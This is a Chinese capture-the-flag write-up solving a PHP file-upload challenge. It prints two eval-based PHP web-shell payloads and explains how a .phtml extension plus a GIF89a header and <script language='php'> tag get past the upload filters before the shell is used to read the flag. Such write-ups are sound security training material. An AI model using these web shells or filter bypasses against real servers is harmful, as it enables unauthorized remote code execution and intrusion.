# [极客大挑战 2019]Upload  
TAG:PHP 任意文件上传  
## 解题过程  
经典的文件上传题目，打开页面就看到了文件上传页面  
![20210104093104](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104093104.png)  
随意选择一张图片上传，并用burpsuite工具拦截数据包，将数据包发送到重发器进行任意文件上传测试  
![20210104093241](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104093241.png)  
将上传文件名后缀改为php，文件内容改成```<?php @eval($_POST['SHELL])?>```,尝试上传  
提示文件后缀不能为```php```,将后缀名修改为php5也会被拦截  
![20210104094025](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104094025.png)  
尝试使用```phtml```后缀,成功绕过后缀检测，但```<?```被检测出  
![20210104094233](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104094233.png)
尝试使用JS法绕过检测成功  
```GIF89a? <script language="php">eval($_REQUEST[shell])</script>```
![20210104095404](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104095404.png)  
使用蚁剑连接shell，注意上传的文件在```/upload/1.phtml```，在服务器根目录找到flag文件，打开终端使用cat命令查看文件内容获得flag  
![20210104095608](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104095608.png)  
## 题目分析  
此题为存在一定过滤的任意文件上传考察，在实战中也较为常见  
phtml也为apache可以解析的后缀，意为包含php代码的html文件，需要在配置文件中打开解析支持，可以作为过滤绕过的突破口  